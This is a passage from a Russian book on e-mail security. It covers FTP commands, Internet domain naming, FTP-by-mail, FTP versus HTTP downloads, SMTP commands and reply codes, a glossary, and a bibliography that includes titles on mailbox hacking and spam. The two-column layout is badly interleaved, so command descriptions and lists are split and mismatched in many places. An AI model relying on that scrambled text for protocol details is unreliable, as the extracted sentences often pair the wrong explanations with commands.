ны, а команды везде одни и те же. Операционную систему уда
ленного компьютера можно узнать, введя system..
Список файлов в текущем каталоге можно узнать с помо
щью команды dir. На первый взгляд в списке мало понятного. Но
будем двигаться слева направо.
Сначала идут 10 символов. Это биты доступа. Для вас пред
ставляет интерес только первый символ. Если это « », то он обо
значает файл, если «d» — то директорию.
162
E mail «безопасная»
File Transfer Protocol
File Transfer Protocol
■ 
Формирование адреса
Для того, чтобы обратиться к удаленному компьютеру в
Internet, нужно иметь его адрес. Знать правила формирования ад
ресов не обязательно, но полезно. Представляя особенности их
формирования, можно определить физическое расположение сер
вера (хотя далеко и не всегда), организацию владельца, ее область
деятельности.
Итак, адрес в Internet состоит из набора доменов, причем
уточнение идет справа налево. Имена доменов разделяются точ
кой. Вложенных доменов может быть сколь угодно много.
Существует негласное правило, согласно которому крайний
правый домен определяет или страну, или принадлежность вла
дельца к какой либо области деятельности.
edu — образование
■ gov — правительственное учреждение
■ mil — военная организация
■ com — коммерческая организация
■ org — некоммерческая организация
■ ua — Украина
Каждая страна имеет свое имя.
Например:
mainpgu.karelia.ru
Домен ru в конце обозначает Россию (RUssia). Далее указан
домен «karelia», также являющийся «географическим». Деление
регионов на географические зоны произвольно. Обычно это дела
ется с учетом количества населения. Если город большой, напри
мер, Москва или Санкт Петербург, то его имя может следовать
сразу за «ru». Адреса в Москве имеют вид: домен.msk.ru или до
мен.msk.su. Адреса, оканчивающиеся на su были созданы еще при
Советском Союзе, а затем их менять не стали, так как часть поль
зователей работают со старыми адресами.
Самым левым доменом в адресе обычно является имя кон
кретного компьютера. Имя компьютера условно. За одним име
нем могут стоять сколь угодно много компьютеров, распределяю
щих информацию по своим правилам.
Если требуется указать имя пользователя, то справа припи
сывается его имя и знак «@».
Первоначальные «организационные» домены:
■ lv — Латвия
■ 
Затем идет число — размер файла. Самый правый столбик
— имя файла или директории.
uk — Великобритания
■ 
Следующие два столбика — имя владельца и имя группы,
это относится к системе защиты UNIX и для пользователя FTP не
представляет интереса.
net — другие сети
Например:
skyer@mainpgu.karelia.ru
обозначает пользователя с именем skyer на компьютере mainpgu.
karelia.ru.
Зачастую FTP серверы имеют в начале адреса домен ftp, но
это не является обязательным и используется не всегда.
Первоначальные «географические» домены:
■ ■ fi — Финляндия
■ 
Команды
ru (su) — Россия
se — Швеция
E mail «безопасная»
Ниже приведен краткий перечень команд, необходимых для
того, чтобы переписать требуемый файл или файлы при исполь
163
164
E mail «безопасная»
File Transfer Protocol
File Transfer Protocol
зовании FTP клиента с командной строкой. Если есть желание уз
нать остальные команды, которые нужны для профессиональной
работы с FTP, то введите help в вашем FTP клиенте.
При работе с графическим клиентом, поддерживающим со
временный интерфейс, вам, скорее всего, все будет понятно без
объяснений.
put имя_файла [имя_удаленного_файла]
— записать файл на сервер
— переписывает файл с локального компьютера на удален
ный под именем имя_удаленного_файла. Если оно не указано, то
файл записывается в текущий каталог с именем локального фай
ла. Команда запрещена для анонимных пользователей
Учтите, что в именах файлов большие и маленькие буквы mput [имя_файла]
                                            различаются. 
open имя_сервера — открыть соединение — то же самое, что и put, но разрешается использовать шаб
                                                                                                             лоны. Перед записью каждого файла будет запрашиваться под
                                                                                                                                                             тверждение. Для отмены подтверждений введите prompt.
— открывает соединение с сервером. Это имя можно ука
зать сразу при вводе команды, загружающей клиента: ftp ftp.kare
lia.ru.
— записать группу файлов
ascii
— осуществляет переход в другой рабочий каталог на FTP — устанавливает ascii способ передачи файлов. Использует
                                            сервере. ся для пересылки файлов текстов на английском языке. Однако
                                                                                                             для надежности лучше использовать binary.
dir [имя_файла] — выдать список файлов binary
— выдает список файлов в текущей директории. Если вам — устанавливает двоичный способ пересылки файлов. При
                                             интересен формат списка каталога, нажмите здесь. Не забывайте, этом файл при передаче не перекодируется и записывается в не
                                                                                                 что можно использовать шаблоны групповых операций. измененном виде. Это наиболее надежный способ передачи фай
                                                                                                                                                                                                                                                 лов.
cd имя_директории — сменить каталог
get имя_файла [имя_локального_файла] — переписать файл
— переписывает файл с удаленного компьютера на локаль
ный. Если указано имя локального файла, то записывает его под
этим именем, иначе — в каталог по умолчанию.
mget [имя_файла] — переписать группу файлов
close
— закрывает соединение с данным сервером и производит
возврат в командный режим. Эта команда автоматически выпол
няется при выходе из FTP клиента.
— то же самое, что и get, но разрешается использовать шаб quit
                                           лоны. Перед копированием каждого файла будет запрашиваться 
                                                                                              подтверждение. Для отмены подтверждений введите prompt. 
prompt — регистрирует на текущем сервере с новым именем. Ис
                                                  пользуйте эту команду, если вы первый раз по ошибке неправиль
                                                                                                    но ввели имя анонимного пользователя и не хотите снова пере
                                                                                                                                                     набирать команду open.
— отменяет подтверждение в командах mget и mput.
E mail «безопасная»
165
— выход из FTP клиента.
user
166
E mail «безопасная»
File Transfer Protocol
File Transfer Protocol
lcd [имя_директории]
— осуществляет переход на локальном компьютере в указан
ный каталог.
pwd
— выводит на экран текущий каталог на удаленном компью
тере.
system
— выводит на экран тип операционной системы на удален
ном компьютере.
help [FTP команда]
— помощь
— выдает краткую информацию о командах FTP клиента
или о конкретной указанной команде.
FTP mail
Запоминать специальных команд для заказов не требуется.
Просто вы указываете в письме обычные FTP команды в поряд
ке их следования. Письмо может выглядеть примерно так:
To:
ftpmail@имя_специального_сервера
Subject:
open ftp.karelia.ru
cd pub
dir
close
— для того, чтобы вам прислали список файлов из /pub.
Чтобы заказать файл:
To:
ftpmail@имя_специального_сервера
Subject:
open ftp.karelia.ru
cd /pub/msdos
get kermit.zip
close
Сервис ftp mail является удобным средством для получения
больших файлов. Кроме того, есть возможность предварительной
обработки файлов, например, разбить их на куски по 64k до пе
ресылки их вам (удобно для модемов). Однако имейте в виду, что
кто то (скорее всего вы) оплачивает почту, так что выясните это
прежде чем пользоваться услугами ftp mail.
Многие протоколы в Internet подразумевают прямое под Работа с FTP в среде WWW
                                      ключение. Однако не все пользователи имеют такую возможность. 
                                                                                          Гораздо проще подключаться на незначительное время и быстро 
                                                                                                                                              одним пакетом переписывать всю информацию. Такие возможно 
                                                                                                                                                                                                сти предоставляет электронная почта (e mail). Кроме того, почта 
                                                                                                                                                                                                                                              не требует немедленной обработки. Лежит себе письмо в почто 
                                                                                                                                                                                                                                                                                                вом ящике, никому не мешая, до тех пор, пока не появится сво 
                                                                                                                                                                                                                                                                                                                                              бодное время у получателя, чтобы посмотреть его. Почтой обыч 
                                                                                                                                                                                                                                                                                                                                                                                                но занимаются специально выделенные для этого компьютеры, 
                                                                                                                                                                                                                                                                                                                                                                                                                                                  работающие в автоматическом режиме. 
Все описанное выше повод для пересылки файлов по поч Как показывает практика, на сегодняшний день основной
                                            те. Действительно, заказали вы себе файл и получили его через услугой Internet является WWW. Весь мир с замиранием сердца
                                                                                              несколько дней, не заботясь ни о каких разрывах связи, не нерв следит за сражениями броузеров, Java, технологий встраивания
                                                                                                                                                ничая перед дисплеем, глядя на медленно увеличивающиеся про multimedia в HTML страницы. Однако любому человеку понятно
                                                                                                                                                                                                   центы. Поэтому были созданы специальные службы, которым — главное, это уметь использовать уже существующие инструмен
                                                                                                                                                                                                                                                  можно заказать требуемый файл по почте. Это и называется FTP ты. Основой данной главы будет рассмотрение части возможнос
                                                                                                                                                                                                                                                                                                 mail. тей http протокола, а именно — передачи файлов. Каждый, кто
E mail «безопасная» 168
167
E mail «безопасная»
File Transfer Protocol
File Transfer Protocol
работает с WWW знает, что такое URL, Uniform Resource Locator.
На сегодня это основной способ указания ресурсов Internet. На
иболее подробно об URL можно прочесть в RFC 1738 и RFC 1808.
Общий формат URL:
&ltscheme>:&ltscheme specific part>
Например, для HTML файла можно сформировать следую
щие URL:
http://www.karelia.ru.
Для почтового адреса:
mailto:skyer@mainpgu.karelia.ru.
FTP также является ресурсом Internet. URL для ftp выгля
дит так:
ftp://&ltuser>:&ltpassword>@&lthost>:&ltport>/&lturl path>
где user — имя пользователя, password — его пароль, host — до
менное имя или IP адрес сервера, url path — путь к файлу. На
практике наиболее часто используемым вариантом ftp является
анонимный. Как уже было сказано выше, анонимный ftp ничем
не отличается от «остального». Просто в качестве имени пользо
вателя достаточно указать anonymous, а в качестве своего пароля
— свой почтовый адрес. Для анонимного ftp в url сделан упрощен
ный синтаксис:
ftp://&lthost>/&lturl path>
то есть при отсутствии имени автоматически будет вставлено
anonymous. Порт также обычно не указывается, а используется
стандартный 21.
Примеры адресов ftp в форме url:
ftp://ftp.cdrom.com/pub/music/songs/1996
ftp://ds.internic.net/rfc/rfc1738.txt
В качестве host можно указывать и IP адрес: 118.24.64.24.
Основное применение url нашли в WWW броузерах. На се
годня это, наверное, самые популярные программы в Internet.
Netscape Navigator, Internet Explorer, Mosaic, Lynx, Arena. Поэто
му если вы используете их, имеет смысл использовать их и как ftp
E mail «безопасная»
169
клиент. Правила формирования адреса были описаны выше, все
остальное предельно просто. Если в качестве пути указан только
путь к некоторому каталогу, а не сам файл (пример 1), то броузер
покажет вам список файлов в этом каталоге. Если же путь указан
вплоть до имени файла, то вскоре файл с некоторой вероятнос
тью окажется у вас на диске. Почему с некоторой вероятностью?
Потому, что к сожалению, http использует для ftp собственную
подсистему пересылки файлов. Что не привело к повышению на
дежности. Однако об этом чуть позже.
Искушенный пользователь WWW заметит, что иногда адре
са файлов в url в качестве scheme содержат http вместо ftp. Это
разные, и в то же время одинаковые вещи. Дело в том, что ука
зывая http, вы говорите WWW серверу искать файл в области ка
талогов, которые отведены HTML файлам. Если ftp, то указывае
мые каталоги будут совпадать с теми, которые доступны
посредством классического ftp.
Сравнение HTTP и FTP путей
URL
Реально на сервере
ftp://ftp.karelia.ru/pub/unix /home/ftp/pub/unix
http://ftp.karelia.ru/pub/unix /files/www/pub/unix
Хотя реально принципы передачи в обеих случаях одинако
вы. На самом деле здесь кроется одна очень большая проблема.
Некоторые организации, имеющие быстрый доступ к Internet за
бывают, что не у всех он столь же быстр. Таким пользователям
удобно использовать классический ftp вместо WWW броузера. Де
ло в том, что реализация ftp в http оставляет желать много лучше
го.
Основной предмет критики — отсутствие такой полезной
функции как reget. Это особенно актуально для низкоскоростных
российских коммуникаций, где скорость порой падает до не
скольких десятков байт в секунду. При такой скорости разрыв со
единения — очень частое явление. И переслать файл в несколько
мегабайт уже является большой проблемой. При потере соедине
ния вы воспользуетесь reget в ftp клиенте, однако в среде WWW
170
E mail «безопасная»
File Transfer Protocol
File Transfer Protocol
вам, увы, придется начать все сначала. Более того, если вы рабо
таете с WWW через proxy, основанном на программном обеспече
нии от CERN, то есть вероятность, что при обрыве соединения
он решит, что весь файл уже переслан и на все попытки получить
его с удаленного WWW сервера proxy будет выдавать урезанный
файл со своего диска. В таком случае два совета — либо смените
proxy сервер, либо вообще отключите его использование.
Однако имейте в виду, что на сегодня очень популярны так
называемые firewall, когда реальный выход в Internet имеют толь
ко proxy и последний совет в таком случае бесполезен. Есть еще
третий совет — подождите несколько дней, пока proxy не позабу
дет про Ваш файл и снова обратится в Internet для его пересыл
ки. Однако это, безусловно, не рабочее решение.
Иногда http и ftp каталоги синхронизированы. Хорошим
представителем является ftp.cdrom.com. Там каталоги не только
синхронизированы, но и очень красиво оформлены при обраще
нии к ним из WWW броузера. Делается это просто, но не каждый
соберется так красиво все оформить.
Кроме всего сказанного, оставшихся оптимистов ожидает
еще одна пилюля. Согласно протоколу http, через который осуще
ствляются коммуникации WWW, после каждого сеанса связи со
единение между компьютерами разрывается. Это означает, что ес
ли вы решите с удовольствие погулять в броузере по каталогам, то
возможно это не всегда будет так здорово, как кажется. На уста
новление соединения, регистрацию пользователя уходит несоиз
меримо больше времени, чем интерактивная работа в ftp клиенте.
Вот так вот приходится платить за современный модный интер
фейс.
Некоторые выводы
Преимущества:
■ Высокая интеграция в гипертекстовое пространство
                                               Internet.
■ Современное программное обеспечение.
E mail «безопасная»
171
Недостатки:
■ Отсутствие reget.
■ Невысокая надежность соединения на плохих
                                        линиях.
■ Встречающиеся проблемы при обрыве соединения со
                                             включенным proxy
■ Невысокая скорость работы из за закрытия
                                      соединения после пересылки.
■ Недоступность файлов через ftp, адресуемых через
                                          протокол http (хотя это и не недостаток самого http,
                                                                           это его особенность.)
Как нетрудно заметить, все недостатки компенсируются на
дежными и быстрыми линиями связи. Уже достаточно канала в
256k у провайдера, и основные проблемы исчезают.
Необходимо отметить, что в ближайшем времени http ста
нет основной системой для пересылки файлов. Большую роль
здесь играет развитие WWW, на которую теперь ориентируются
практически все системы в Internet. Плюс постоянный рост воз
можностей самих броузеров. Сегодня уже часто оказывается удоб
нее воспользоваться ftp mail. А Netscape Navigator уж сам извле
чет файл из письма, распакует его и приготовит для запуска.
Таким образом, служба ftp сегодня сильно меняется. Сам ftp все
гда являлся достаточно актуальной проблемой, что очень хорошо
видно при просмотре документации. Публикации на эту тему по
являлись в Internet регулярно с 1973 года, хотя тогда это еще и не
называлось Internet.
Кроме того, актуальность просто пересылки файлов для ря
дового пользователя падает. Если раньше большое количество до
кументации, звуков, изображений лежало мертвым грузом на ftp,
то теперь все чаще ту же информацию можно получить в виде кра
сиво оформленного, и с большей вероятностью более свежего,
html файла. Однако предсказать дату, когда получение информа
ции не будет выражаться в виде конкретного файла пока невоз
172
E mail «безопасная»
File Transfer Protocol
File Transfer Protocol
можно. И большинство людей так и работает «по старинке». Все
таки архивы программ пока еще остаются файловыми архивами.
Советы по использованию FTP
FTP заключает в себе очень большой объем информации.
Поэтому очень несложно просто захлебнуться в ней. А если еще
учесть и безликость имен файлов, то приходится сделать вывод —
для того, чтобы профессионально использовать FTP надо обдумы
вать все свои действия. Поэтому позвольте представить вам не
сколько советов, дабы облегчить ваши странствования.
Никогда не исследуйте FTP пространство, соединяясь со
всеми попавшимися серверами и заходя во все каталоги. Частень
ко новичок, получив доступ к FTP просто тратит много времени
впустую, листая каждый каталог и заходя во все каталоги. Уясни
те сразу — нужной информации таким образом не найдете, а вре
мени потеряете много.
Особенно если в ваших поисках не будет четкой цели. Дело
в том, что имена файлов — это не документация к ним. Иногда
встречается такое название, что его на клавиатуре то набрать
сложно. А понять смысл и вовсе невозможно. Нужно также отме
тить, что в Internet очень много серверов, содержащих, мягко го
воря, кучу хлама. А есть и всемирно известные, такие как
ftp.funet.fi или ftp.cdrom.com. Не тратьте свою жизнь на изучение
«сереньких» серверов. Лучше потратьте пару дней и изучите по
пулярные.
Из первого пункта вы должны понять, что FTP пространст
во — это огромный склад архивов. Поэтому нужен каталог всех
документов. На первый взгляд такое невозможно — ведь это мил
лионы компьютеров. Однако кое у кого нашлась пара лишних
долларов и на свет появилась archie — база данных по содержи
мому FTP серверов. С периодичностью раз в месяц эти компью
теры «обзванивают» все известные им FTP серверы, заходят в
каждый каталог и запоминают его содержимое. То есть делают ра
E mail «безопасная»
173
боту, которую вам пришлось бы делать вручную. К сожалению эти
базы данных доступны через telnet — это протокол, по которому
можно стать полноценным пользователем удаленного компьюте
ра.
Однако, имя файла не всегда отражает суть его содержания.
Чаще бывает даже наоборот — суть не отражает имя файла. По
пробуйте сформулировать возможные имена файлов программ баз
данным по электронике. Никак. Вообще, универсального реше
ния тут дать нельзя. Но можно воспользоваться следующей осо
бенностью. Большое количество FTP серверов заставляет некото
рых их владельцев проводить нечто вроде рекламы. Частенько
можно встретить файлы примерно следующего названия: «Новые
файлы на файловом сервере...». Обычно их можно найти в теле
конференциях. Вам повезло, если вы нашли сервер по интересу
ющей вас тематике, который к тому же постоянно рассылает дай
джесты с описанием новых файлов.
Если вам все же надо быстро «просканировать» содержимое
сервера, то и тут часто не требуется заглядывание во все катало
ги. Большинство серверов регулярно автоматически генерируют
каталог своего содержимого и кладут его в самый верхний ката
лог. Вы можете переписать его себе и изучить его содержимое на
досуге.
Относительно FTP клиентов. Если у вас имеется только
FTP клиент с командной строчкой, а есть желание иметь какую
нибудь среду поудобнее, то могу посоветовать использовать
WWW клиенты. Их обычно называют WWW броузерами (WWW
browsers).
Однако учтите, что WWW броузер каждый раз выполняет
новое соединение, когда вы переходите в новый каталог или бе
рете файл, и закрывает после окончания действия. Поэтому такой
способ исследования директорий потребует намного больше вре
мени чем команды cd и dir.
В начале 90 х годов в Internet стала набирать популярность
WWW — World Wide Web. Сейчас это огромная гипертекстовая
174
E mail «безопасная»
File Transfer Protocol
File Transfer Protocol
сеть, охватывающая весь мир. А удобство представления инфор
мации ни с чем не сравнимо. Очень качественно подготовленные
документы создают впечатление работы с документом как с про
граммой. Поэтому WWW больше подходит для навигации в ин
формационном поле. Поэтому стало правилом класть описания
программных документов вместе с ссылкой на FTP сервер, где эту
программу можно найти. Это не значит, что для каждого файла,
доступного через FTP можно найти описание в WWW. Описания
есть в основном для известных программ.
зи. В таких случаях можно порекомендовать использовать расши
рение команды get — reget. Но при этом вам придется прерывать
передачу файла искусственно, а затем при помощи reget продол
жить копирование.
Однако воспользоваться WWW стоит вот почему: здесь су
ществуют куда более качественные поисковые системы чем archie.
И ищут они не по имени документа, а по всем словам из всех из
вестных документов. Поэтому сформулируйте, какие ключевые
слова могут встречаться в требуемой вам теме и обратитесь к од
ному из поисковых серверов, например http://www.altavista.digi
tal.com Есть вероятность, что вы можете найти документ со спи
сков FTP серверов по требуемой вам теме.
Частенько можно встретить огромные текстовые файлы. В
них перечислены сотни FTP серверов с кратким описанием их со
держимого. Попробуйте воспользоваться ими, хотя это и не луч
ший способ найти требуемую информацию.
Если вы незнакомы с сервером и имеете желание исследо
вать его, то не делайте этого в каталогах /bin, /usr, /etc, /dev —
там находятся системные файлы, необходимые UNIX для работы.
Там просто нет ничего интересного.
Ну а что же делать, если во время копирования большого
файла связь неожиданно разорвалась? Вообще, есть три класси
ческих способа решения этой проблемы:
■ Скопировать файл заново
■ Использовать расширение команды get — reget. Ее
                                    синтаксис: get r имя_файла.
Иногда встречаются очень большие файлы. И по определен
ным причинам вы не можете скопировать его за один сеанс свя
E mail «безопасная»
175
176
E mail «безопасная»
Приложения
Приложения
Приложения
VRFY <SP> <string> <CRLF>
Получить информацию о пользователе, имя которого
указывается в качестве аргумента команды (<string>)
EXPN <SP> <string> <CRLF>
Команды протокола SMTP Получить информацию о пользователях зарегистрирован
                                                                                     ных в качестве получателей корреспонденции
HELO <SP> <domain> <CRLF> HELP [<SP> <string>] <CRLF>
Открыть сессию взаимодействия по протоколу SMTP. NOOP <CRLF>
                                      <domain> — доменное имя машины 
Краткая справка по командам протокола
Нет операции
MAIL <SP> FROM:<reverse path> <CRLF>
Сообщить адрес отправителя (<reverse path>). Обязательная QUIT <CRLF>
                                    команда, которую надо выдать перед отправкой сообщения 
RCPT <SP> TO:<forward path> <CRLF> TURN <CRLF>
Завершить сессию
Сообщить адрес получателя (forward path). Обязательная
команда, которую выдают после MAIL FROM, но перед DATA
Поменяться местами серверу и клиенту
DATA <CRLF> Коды возврата SMTP
Начать передачу тела почтового сообщения. Тело сообще 211 System status, or system help reply
                                              ния должно кончаться точкою(«.») в первой позиции строки 
Статус системы или Help
SEND <SP> FROM:<reverse path> <CRLF>
Послать сообщение на терминал пользователя, который
определяется командой RCPT
214 Help message. [Information on how to use the receiver or the
meaning of a particular non standard command; this reply is useful
only to the human user]
SOML <SP> FROM:<reverse path> <CRLF>
SEND OR MAIL. Послать в почтовый ящик или на
терминал пользователя
Краткая справка
220 <domain> Service ready
SMTP сервис готов к работе
SAML <SP> FROM:<reverse path> <CRLF>
SEND AND MAIL. Послать в почтовый ящик и на терминал
пользователя
221 <domain> Service closing transmission channel
Сервис закрыл канал передачи данных
250 Requested mail action okay, completed
Соединение установлено
E mail «безопасная»
177
178
E mail «безопасная»
Приложения
Приложения
251 User not local; will forward to <forward path>
Пользователь не местный. Выполнить перенаправление
запроса
550 Requested action not taken: mailbox unavailable [E.g., mailbox
not found, no access]
Не найден соответствующий почтовый ящик
551 User not local; please try <forward path>
354 Start mail input; end with <CRLF>.<CRLF>
Начать ввод почтового сообщения
421 <domain> Service not available, closing transmission channel
[This may be a reply to any command if the service knows it must
shut down]
Сервис отсутствует. Канал передачи данных закрыт
Пользователь не найден можно попробовать отправить
почту по другому адресу
552 Requested mail action aborted: exceeded storage allocation
Превышены квоты на использование ресурсов памяти
553 Requested action not taken: mailbox name not allowed [E.g.,
mailbox syntax incorrect]
450 Requested mail action not taken: mailbox unavailable [E.g.,
mailbox busy]
Имя почтового ящика неправильное
Нет возможности записать данные в почтовый ящик
554 Transaction failed
451 Requested action aborted: local error in processing
Обмен завершился аварийно
Ошибка при обработке запроса
452 Requested action not taken: insufficient system storage Список терминов по FTP
Запрос не выполнен недостаточно памяти на вычислитель FTP — File Transfer Protocol
                                               ной установке 
500 Syntax error, command unrecognized [This may include errors
such as command line too long]
Синтаксическая ошибка — нет такой команды
Протокол передачи данных. Он предназначен для передачи
файлов с удаленного компьютера на локальный.
FTP server
Понятие, за которым скрывается обычный компьютер. Но
так как он содержит общедоступные файлы и настроен на под
держку протокола FTP, то его называют сервером — поставщи
ком информации. Вообще, практически любой компьютер с опе
рационной системой UNIX позволяет подключаться к нему по
FTP протоколу. Соединение выполняется с помощью FTP клиен
та
501 Syntax error in parameters or arguments
Синтаксическая ошибка в аргументах команды
502 Command not implemented
Данная команда не может быть выполнена
503 Bad sequence of commands
Неправильная последовательность команд
FTP соединение
504 Command parameter not implemented
Параметр команды не может быть использован в данном
контексте
E mail «безопасная»
179
Соединение с удаленным компьютером при помощи FTP
протокола
180
E mail «безопасная»
Приложения
Приложения
FTP client
Сервисная программа, с помощью которой можно произве
сти соединение с FTP сервером. Обычно эта программа имеет ко
мандную строку, но некоторые имеют оконный интерфейс и не
требуют запоминания команд.
anonymous
Имя анонимного пользователя. Анонимность пользователя
заключается в том, что он имеет право только копировать (down
load) общедоступные файлы и не может записывать на сервер но
вые (upload).
upload
Таким словом обозначается процесс записи файлов с ло
кального компьютера на удаленный. Это процесс обратный down
load.
download
Таким словом обозначается процесс записи файла с удален
ного компьютера на локальный. Это процесс, обратный upload.
login
Каждый пользователь в системе должен иметь свое имя. По
этому существует такая операция login, с помощью которой вхо
дящий пользователь регистрируется. Эта операция применяется
не только в FTP, но м в других системах, например telnet. В прин
ципе, для обычного пользователя все это заключается в простом
правиле — после того, как на экране появится слово login:, нуж
но ввести имя для входа в систему. Например:
login: anonymous
password
пользователя паролем служит ваш адрес на локальном компьюте
ре в формате e mail адреса Internet'а. Если вы его не знаете,
справьтесь у своего администратора. Вообще его общий вид:
имя@домен.домен, где домен — это имя домена.
Когда будете набирать пароль, не удивляйтесь, что буквы не
появляются на экране — это в целях безопасности.
В принципе, для анонимного пользователя пароль вроде бы
как и не нужен, но он все таки введен для того, что бы быть уве
ренным, что человек осознает, что он делает.
И еще: многие FTP клиенты вводят пароль анонимного
пользователя автоматически, если вы нажмете Enter после пригла
шения. Проверьте это на своей программе.
telnet
Иногда требуется подключиться к удаленному компьютеру
так, чтобы работать как бы с клавиатуры этого компьютера. Это
можно осуществить, используя telnet. Однако копирование фай
лов на локальный компьютер при таком подключении затрудне
но, но возможно при помощи таких протоколов как, например,
ZMODEM, KERMIT, которые обычно применяются в модемах.
Встретить такие протоколы можно на Internet BBS. Однако не сто
ит сильно рассчитывать на такой способ копирования файлов.
WWW
World Wide Web. Система гипертекстовых документов, ны
не являющаяся, наверное, самой популярной системой на базе
Internet'а.
HTTP — HyperText Transfer Protocol
Этот протокол используется в системе WWW. Имеет в сво
ем составе несколько других, например предмет рассмотрения
данного учебника — FTP.
Для обеспечения безопасности компьютерных систем одно root каталог
                                                го имени для входа в систему недостаточно. Ведь можно запрос 
                                                                                                  то узнать имя владельца системы и воспользоваться им. Но эта 
                                                                                                                                                    проблема легко решается с помощью пароля. После того, как вы 
                                                                                                                                                                                                     ввели имя, требуется ввести пароль, который известен только вам 
                                                                                                                                                                                                                                                          или определенному кругу лиц. В системе FTP для анонимного 
E mail «безопасная» 182
181
Самый верхний каталог в иерархии файлов. Обычно, когда
вы открываете FTP соединение, то находитесь в root каталоге. Но
E mail «безопасная»
Приложения
Приложения
некоторые «умные» программы могут автоматически перейти в
каталог, который вы укажете при запуске или в тот, в котором вы
побывали в последний раз на этом сервере. Перейти в root ката
лог можно командой cd /.
FTP mail
Служба доставки файлов с FTP серверов по электронной
почте.
UNIX
Одна из популярнейших многотерминальных операционных
систем. Она обеспечивает достаточную надежность и безопас
ность, позволяя работать одновременно нескольким пользовате
лям, распределяя между ними ресурсы вычислительной системы.
Archie
База данных по содержимому FTP серверов. Их в мире не
сколько. Раз в месяц они «обзванивают» все известные им FTP
сервера и обновляют свою базу данных. Рекомендуется использо
вать ближайший archie сервер для равномерного распределения
запросов по всему миру. Самый близкий к России archie.funet.fi
Для того, чтобы воспользоваться этой базой данных вам потребу
ется telnet соединение. Наберите имя пользователя archie и затем
prog имя_файла. Вас поставят в очередь и сообщат расчетное вре
мя поиска. По прошествии этого времени вам будут сообщены все
ссылки на файлы, в именах которых встретилось указанное вами
слово.
Remote computer
Удаленный компьютер. Это компьютер, с которым мы ини
циируем соединение. Удаленный — это не значит, что он нахо
дится далеко. Он может находиться и на соседнем столе.
Local computer
Локальный компьютер. Это компьютер, с которого мы в
данный момент работаем и совершаем соединение.
FTP командны
Последовательность команд, удовлетворяющих синтаксису
FTP.
E mail «безопасная»
183
184
E mail «безопасная»
Список использованной литературы
Список использованной литературы
Список использованной литературы
Взлом мыла (user manual)
zLOB
Учебник по FTP
http://zlob.bos.ru
Стояновский А.
Шифруемся
http://amber777.chat.ru Анатолий Ремнев
MAIL — взлом и безопасность Маленькие хитрости твоего мыла
Virus (card@hacknow.org). Крис Касперски
Трудное рождение
Дмитрий Торопов toropovd@osp.ru.
Не подпускайте к себе Web шпионов
Стив Басс
Борьба за сетевую неприкосновенность
Стив Басс
Кто ты такой?
Анита Карве
Алгоритм шифрования с открытыми ключами
Дмитрий Ганьжа
Советы начинающему спамеру
Чернухин Евгений http://www.pocherk.ru
Червивая почта и порноспам
Владислав Михайлов www.softterra.ru
Некоторые методы технического взлома
почтового ящика с WWW интерфейсом (на
примере www.mail.ru)
A.V. Komlin avkvladru@netscape.net
E mail «безопасная»
185
186
E mail «безопасная»

